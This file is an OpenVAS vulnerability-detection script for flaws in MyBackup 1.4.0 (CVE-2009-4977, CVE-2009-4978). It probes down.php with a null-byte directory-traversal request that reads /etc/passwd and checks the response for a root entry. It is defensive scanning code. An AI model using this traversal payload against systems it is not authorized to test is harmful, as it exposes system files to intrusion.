###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybackup_08_10.nasl 5323 2017-02-17 08:49:23Z teissa $
#
# MyBackup 1.4.0 Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "MyBackup is prone to multiple security vulnerabilities. These
vulnerabilities include a directory-traversal vulnerability and a
arbitrary PHP code execution vulnerability.

An attacker can exploit these vulnerabilities to execute arbitrary
php code in the context of the affected site or obtain sensitive 
information. Other attacks are also possible.

MyBackup 1.4.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100768);
 script_version("$Revision: 5323 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-08-31 14:30:50 +0200 (Tue, 31 Aug 2010)");
 script_cve_id("CVE-2009-4977","CVE-2009-4978");

 script_name("MyBackup 1.4.0 Multiple Security Vulnerabilities");

 script_xref(name : "URL" , value : "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4978");
 script_xref(name : "URL" , value : "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4977");

 script_tag(name:"cvss_base", value:"6.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/backup","/mybackup",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/down.php?filename=../../../../../../../../../../../../etc/passwd%00"); 

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
